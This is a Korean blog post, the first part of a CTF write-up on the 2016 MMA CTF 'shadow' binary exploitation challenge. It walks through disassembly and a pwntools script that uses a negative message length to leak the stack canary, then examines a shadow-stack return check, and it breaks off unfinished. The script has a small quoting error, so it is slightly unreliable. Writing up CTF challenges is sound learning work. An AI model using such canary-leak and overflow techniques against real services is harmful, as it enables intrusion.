---
layout: post
title: "[2016 mma] shadow 풀이 [1]"
date: 2018-06-20 04:44
categories: "[Pwn]CTF"
tags: rotles98
---
>### Host : pwn2.chal.ctf.westerns.tokyo
### Port : 18294
### [shadow](https://github.com/ctfs/write-ups-2016/blob/master/mma-ctf-2nd-2016/pwn/shadow-400/shadow)

1. **스택 카나리**문제를 풀어보고 싶다.

2. **쉐도우 스택**도 구경해보고 싶다.

이런 이유로 이 문제를 골랐습니다!

~~다 작성했는데 sublimetext git이 이상해서 날라감아 안ㅁ아ㅡㄴ마음나으만으~~

- - -
# 0x00. 분석

{: refdef: style="text-align: center;"}
![file](/img/2016_mma/shadow/01.png)
{: refdef}

많네요. 으어어

{: refdef: style="text-align: center;"}
![main](/img/2016_mma/shadow/02.png)
{: refdef}

`main`이 신기하게 생겼네요.

`call`함수를 사용해 `_main`함수를 호출합니다.

{: refdef: style="text-align: center;"}
![call](/img/2016_mma/shadow/03.png)
{: refdef}

함수를 신기하게 부르네요. `push`도 볼 수 있는데 일단 넘어가 봅시다.

{: refdef: style="text-align: center;"}
![\_main](/img/2016_mma/shadow/04.png)
{: refdef}

보시다시피 함수의 인자가 안보입니다. 어셈코드로 보고 어디다가 적어둡시다.

{: refdef: style="text-align: center;"}
![message](/img/2016_mma/shadow/05.png)
{: refdef}

임마가 중요한 함수인데 주석에 적어놨듯이 `Message length`에서 취약점이 발생합니다.

그리고 `getnline`함수에서는 `read`함수를 사용해 입력받습니다.

- - -
# 0x01. 취약점 증명

```asm
  unsigned int v3; // eax
  int i; // [esp+24h] [ebp-34h]
  char v6[32]; // [esp+2Ch] [ebp-2Ch]
  unsigned int canary; // [esp+4Ch] [ebp-Ch]
  int savedregs; // [esp+58h] [ebp+0h]
```

우선 `v6`부터 값이 들어가니까 32개 꽉 채우면 `canary`를 가져올 수 있지 않을까 했어요.

{: refdef: style="text-align: center;"}
![no_canary](/img/2016_mma/shadow/06.png)
{: refdef}

### NOPE

읭 `gdb`로 열어서 왜 안보여주는지 알아봅시다.

{: refdef: style="text-align: center;"}
![null_canary](/img/2016_mma/shadow/07.png)
{: refdef}

원래 그런지는 모르겠는데 이 문제에선 `canary` 제일 앞에 `\x00`이 있더라구요.

```python
from pwn import *
context.log_level = "debug"

HOST = "localhost"
PORT = 4444
s = remote(HOST, PORT)
pause()

############################################

def send(name, length, message):
    s.recv()
    s.send(name)
    s.recv()
    s.sendline(length)
    s.recv()
    s.send(message)

payload = "A"*33

send("n", "-1", payload)
s.recvuntil("payload)
canary = u32("\x00" + s.recv(3))

print "[*] canary : " + hex(canary)
```

{: refdef: style="text-align: center;"}
![yes_canary](/img/2016_mma/shadow/08.png)
{: refdef}

`canary`값을 알아냈어요. 그럼 `ret`까지 쭉 덮으면 풀리겠네요!

{: refdef: style="text-align: center;"}
![before_ret](/img/2016_mma/shadow/09.png)
{: refdef}

헤헤 보시면 `EBP`에 `CCCCDDDD`가 있는걸 볼 수 있어요.

{: refdef: style="text-align: center;"}
![after_ret](/img/2016_mma/shadow/10.png)
{: refdef}

띠용! `call 0x8048cee`가 실행되니까 `EBP`가 정상적으로 바뀌네요.

{: refdef: style="text-align: center;"}
![0x8048cee](/img/2016_mma/shadow/11.png)
{: refdef}

해당 주소로 가보니 `ret`이라는 함수가 문제네요.

`restore_eip`는 `.bss`정도로 예상하고 눌렀는데...

```
.asm:08048D08 restore_eip     db  83h                 ; DATA XREF: ret+11↑o
.asm:08048D09                 db 0ECh
.asm:08048D0A                 db    4
.asm:08048D0B                 db 0E8h
```

`asm`...? 왜 리턴주소가 코드영역에 있죠?

- - -

{: refdef: style="text-align: center;"}
![to be continue](/img/2016_mma/shadow/12.png)
{: refdef}

### to be continue
